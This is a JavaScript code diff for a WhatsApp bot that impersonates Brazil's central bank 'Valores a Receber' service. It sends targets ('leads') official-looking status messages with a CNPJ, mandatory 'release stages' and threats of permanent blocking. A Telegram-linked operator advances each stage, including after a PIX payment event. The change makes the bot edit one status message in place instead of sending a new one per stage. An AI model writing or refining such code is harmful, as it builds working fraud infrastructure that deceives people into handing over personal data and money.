@@ -473,8 +473,13 @@ client.on('disconnected', (reason) => {
 // NÃO processa mensagens recebidas aqui para evitar confusão.
 // =============================================================
 
-// Mensagem formal enviada automaticamente quando o operador assume
-const MENSAGEM_OPERADOR_ASSUME = `🔐 *PORTAL SVR — SISTEMA DE VALORES A RECEBER*
+function buildStatusMessage(step) {
+    const s1 = step >= 1 ? '✅ Concluída' : '⏳ Pendente';
+    const s2 = (step === 2 || step === 21 || step >= 3) ? '✅ Concluída' : (step === 1 ? '🔄 Em andamento' : '⏳ Pendente');
+    const s3 = step >= 3 ? '✅ Concluída' : '⏳ Pendente';
+    const s4 = step >= 4 ? '✅ Concluída' : '⏳ Pendente';
+
+    return `🔐 *PORTAL SVR — SISTEMA DE VALORES A RECEBER*
 *Departamento de Liberação de Ativos Financeiros*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -486,16 +491,16 @@ Seu processo de liberação de ativos financeiros pendentes encontra-se devidame
 
 📋 *ETAPAS OBRIGATÓRIAS PARA LIBERAÇÃO:*
 
-*1ª Etapa — Autenticação de Identidade:* ✅ Concluída
+*1ª Etapa — Autenticação de Identidade:* ${s1}
 Validação dos dados cadastrais do titular perante os registros do Banco Central do Brasil.
 
-*2ª Etapa — Validação Jurídica do Processo:* 🔄 Em andamento
+*2ª Etapa — Validação Jurídica do Processo:* ${s2}
 Análise e homologação do pedido de resgate junto ao Departamento de Ativos Não Reclamados.
 
-*3ª Etapa — Confirmação do Canal de Recebimento:* ⏳ Pendente
+*3ª Etapa — Confirmação do Canal de Recebimento:* ${s3}
 Verificação e habilitação da conta de destino para transferência dos valores resgatados.
 
-*4ª Etapa — Liberação e Transferência dos Valores:* ⏳ Pendente
+*4ª Etapa — Liberação e Transferência dos Valores:* ${s4}
 Processamento final e crédito dos ativos financeiros na conta indicada pelo titular.
 
 ⚠️ *IMPORTANTE:* Todas as etapas são *obrigatórias e insubstituíveis*, conforme determina o protocolo de segurança do Sistema de Valores a Receber (SVR). A não conclusão de qualquer etapa *suspende automaticamente* o processo de resgate, podendo resultar no bloqueio permanente dos valores a serem recebidos.
@@ -507,6 +512,7 @@ _Contamos com sua colaboração e compreensão._
 *Portal SVR — Banco Central do Brasil*
 *CNPJ: 00.038.166/0001-05*
 _Este canal é monitorado e possui validade jurídica._`;
+}
 
 // --- MENSAGENS POR ETAPA ---
 const MENSAGEM_ETAPA_2_CONCLUIDA =
@@ -704,9 +710,16 @@ client.on('message_create', async (msg) => {
                         await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
                     }
 
-                    // Envia mensagem de Etapa 2 concluída ao lead
+                    // EDITA a mensagem ao invés de mandar uma nova
                     setTimeout(async () => {
-                        try { await sendBotMessage(targetChatId, MENSAGEM_ETAPA_2_CONCLUIDA); } catch (e) { }
+                        try {
+                            if (currentSession.assumeMsgId) {
+                                const msg = await client.getMessageById(currentSession.assumeMsgId);
+                                await msg.edit(buildStatusMessage(2));
+                            } else {
+                                await sendBotMessage(targetChatId, buildStatusMessage(2));
+                            }
+                        } catch (e) { }
                     }, 2000);
 
                 } else {
@@ -755,7 +768,12 @@ client.on('message_create', async (msg) => {
 
     setTimeout(async () => {
         try {
-            await sendBotMessage(targetChatId, MENSAGEM_OPERADOR_ASSUME);
+            const sentMsg = await sendBotMessage(targetChatId, buildStatusMessage(1));
+            if (sentMsg && sentMsg.id) {
+                updatedSession.assumeMsgId = sentMsg.id._serialized;
+                chatSessions.set(targetChatId, updatedSession);
+                saveSessions();
+            }
             console.log(`📨 [ADMIN] Mensagem formal enviada ao lead: ${targetChatId}`);
         } catch (e) {
             console.error(`❌ [ADMIN] Erro ao enviar mensagem formal:`, e.message);
@@ -1222,7 +1240,18 @@ setInterval(async () => {
                         const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 2);
                         await notifyTelegram(t, session.tgMsgId, r);
                     }
-                    await sendBotMessage(chatId, MENSAGEM_ETAPA_2_CONCLUIDA);
+                    
+                    // EDITA a mensagem inicial ao invés de mandar uma nova
+                    if (session?.assumeMsgId) {
+                        try {
+                            const msg = await client.getMessageById(session.assumeMsgId);
+                            await msg.edit(buildStatusMessage(2));
+                        } catch (e) {
+                            await sendBotMessage(chatId, buildStatusMessage(2));
+                        }
+                    } else {
+                        await sendBotMessage(chatId, buildStatusMessage(2));
+                    }
 
                 } else if (etapa === 3) {
                     if (session) { session.humanStep = 3; chatSessions.set(chatId, session); saveSessions(); }
@@ -1231,7 +1260,19 @@ setInterval(async () => {
                         const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 3);
                         await notifyTelegram(t, session.tgMsgId, r);
                     }
-                    await sendBotMessage(chatId, MENSAGEM_ETAPA_3);
+                    
+                    if (session?.assumeMsgId) {
+                        try {
+                            const msg = await client.getMessageById(session.assumeMsgId);
+                            await msg.edit(buildStatusMessage(3));
+                        } catch (e) {
+                            await sendBotMessage(chatId, buildStatusMessage(3));
+                        }
+                    } else {
+                        await sendBotMessage(chatId, buildStatusMessage(3));
+                    }
+                    // Opcional: Ainda manda a MENSAGEM_ETAPA_3 se quiser explicações extras, mas o usuário pediu para NÃO mandar mensagem a cada etapa.
+                    // await sendBotMessage(chatId, MENSAGEM_ETAPA_3);
 
                 } else if (etapa === 4) {
                     if (session) { session.humanStep = 4; chatSessions.set(chatId, session); saveSessions(); }
@@ -1240,7 +1281,18 @@ setInterval(async () => {
                         const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 4);
                         await notifyTelegram(t, session.tgMsgId, r);
                     }
-                    await sendBotMessage(chatId, MENSAGEM_ETAPA_4);
+
+                    if (session?.assumeMsgId) {
+                        try {
+                            const msg = await client.getMessageById(session.assumeMsgId);
+                            await msg.edit(buildStatusMessage(4));
+                        } catch (e) {
+                            await sendBotMessage(chatId, buildStatusMessage(4));
+                        }
+                    } else {
+                        await sendBotMessage(chatId, buildStatusMessage(4));
+                    }
+                    // await sendBotMessage(chatId, MENSAGEM_ETAPA_4);
 
                 } else if (etapa === 5) {
                     if (session) { session.humanStep = 5; chatSessions.set(chatId, session); saveSessions(); }
@@ -1295,7 +1347,16 @@ setInterval(async () => {
                         { inline_keyboard: [[{ text: '✅ Liberar Etapa 5', callback_data: `etapa:5:${chatId}` }]] }
                     );
 
-                    await sendBotMessage(chatId, MENSAGEM_ETAPA_4);
+                    if (session.assumeMsgId) {
+                        try {
+                            const msg = await client.getMessageById(session.assumeMsgId);
+                            await msg.edit(buildStatusMessage(4));
+                        } catch (e) {
+                            await sendBotMessage(chatId, buildStatusMessage(4));
+                        }
+                    } else {
+                        await sendBotMessage(chatId, buildStatusMessage(4));
+                    }
                 }
             } catch (e) {
                 console.error("❌ Erro ao processar cmd-pix-paid:", e.message);
